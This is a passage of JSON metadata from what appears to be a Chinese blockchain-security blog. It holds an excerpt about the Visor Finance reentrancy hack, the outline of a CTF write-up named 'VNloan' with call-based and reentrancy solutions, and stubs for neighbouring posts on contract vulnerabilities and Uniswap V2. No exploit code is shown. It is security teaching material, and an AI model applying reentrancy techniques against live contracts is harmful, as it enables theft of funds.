Finance遭受黑客攻击，黑客利用重入漏洞耗尽了880万枚VISR代币，当时，VISR的交易价格约为0.93美元，总损失约为820万美元。 因为call调用产生的漏洞还是比较多的，比如重入漏洞，atn...","link":"","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[],"tags":[{"name":"区块链 ctf","slug":"区块链-ctf","count":11,"path":"api/tags/区块链-ctf.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x00-%E8%83%8C%E6%99%AF\"><span class=\"toc-text\">0x00 背景</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x01-VNloan\"><span class=\"toc-text\">0x01 VNloan</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x03-%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">0x03 分析漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%B8%80-call%E8%B0%83%E7%94%A8\"><span class=\"toc-text\">解法一  call调用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%BA%8C-%E9%87%8D%E5%85%A5\"><span class=\"toc-text\">解法二  重入</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x04-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x04  总结</span></a></li></ol>","author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Smart Contract Basic Vulnerability Summary","uid":"ffa4ad3cb02d93d241db5e33b2dfae61","slug":"Smart Contract Basic Vulnerability Summary","date":"2022-08-01T10:46:51.248Z","updated":"2023-01-06T12:52:13.363Z","comments":true,"path":"api/articles/Smart Contract Basic Vulnerability Summary.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-w/images1/img/202208011820525.png","text":"1.关于转账的漏洞在solidity中有三种转账方式，分别是call，transfer和send，后两者相对安全，但也分别对应着漏洞。 call转账漏洞——重入例子： pragma solidity ^0.6.0; import '@openzeppelin/contracts/...","link":"","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":17,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Analysis of uniswapV2","uid":"e27183e0e340d83abbd9dfc8e53b323b","slug":"UniswapV2","date":"2022-08-01T10:44:56.839Z","updated":"2022-12-16T07:39:40.164Z","comments":true,"path":"api/articles/UniswapV2.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/uniswap-uni-logo.png","text":"相对系统且深入的了解了一下uniswapV2 whitepaper： https://uniswap.org/whitepaper.pdf EIP-2612： https://github.com/ethereum/EIPs/blob/master/EIPS/eip-2612.m...","link":"","photos":[],"count_time":{"symbolsCount":"81k","symbolsTime":"1:14"},"categories":[],"tags":[{"name":"区块链 ctf","slug":"区块链-ctf","count":11,"path":"api/tags/区块链-ctf.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}